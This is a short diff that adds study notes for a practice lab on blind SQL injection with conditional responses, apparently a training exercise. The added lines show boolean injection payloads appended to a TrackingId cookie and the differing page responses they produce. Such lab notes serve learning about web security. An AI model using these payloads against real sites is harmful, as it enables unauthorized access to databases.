@@ -210,8 +210,9 @@ Lab11: Blind SQL injection with conditional responses
     tracking cookie 
 
 
-
-
+   -Modify the TrackingId cookie, changing it to: 
+     TrackingId=Ypk14n3CAwrTbG3F'and 1=1 --+  : WELCOME BACK
+     TrackingId=Ypk14n3CAwrTbG3F'and 1=2 --+   : NO RESPONSE 
 
 
 
